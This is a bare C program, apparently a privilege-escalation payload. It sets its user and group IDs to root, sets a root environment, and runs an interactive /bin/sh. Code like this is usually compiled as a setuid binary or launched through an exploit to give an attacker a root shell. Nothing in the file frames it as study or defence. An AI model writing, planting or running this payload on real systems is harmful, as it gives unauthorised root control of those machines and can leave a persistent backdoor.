#include <unistd.h>
#include <stdlib.h>

int main(void) {
    setuid(0);
    setgid(0);
    char *env[] = { "HOME=/root", "PATH=/bin:/sbin:/usr/bin", NULL };
    char *argv[] = { "/bin/sh", "-i", NULL };
    execve("/bin/sh", argv, env);
    return 1;
}
